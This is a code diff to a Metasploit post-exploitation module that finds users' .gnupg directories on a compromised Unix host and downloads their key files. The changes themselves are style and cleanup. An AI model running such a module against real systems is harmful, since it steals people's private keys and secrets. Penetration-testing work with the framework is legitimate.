@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Unix
 
@@ -33,7 +29,7 @@ class MetasploitModule < Msf::Post
     # Array#select! is only in 1.9
     paths = paths.select { |d| directory?(d) }
 
-    if paths.nil? or paths.empty?
+    if paths.nil? || paths.empty?
       print_error("No users found with a .gnupg directory")
       return
     end
@@ -53,7 +49,7 @@ class MetasploitModule < Msf::Post
         if directory?(target)
           next
         end
-        print_status("Downloading #{path}#{sep}#{file} -> #{file}")
+        print_status("Downloading #{target} -> #{file}")
         data = read_file(target)
         file = file.split(sep).last
         type = file.gsub(/\.gpg.*/, "").gsub(/gpg\./, "")
@@ -64,5 +60,4 @@ class MetasploitModule < Msf::Post
 
     end
   end
-
 end
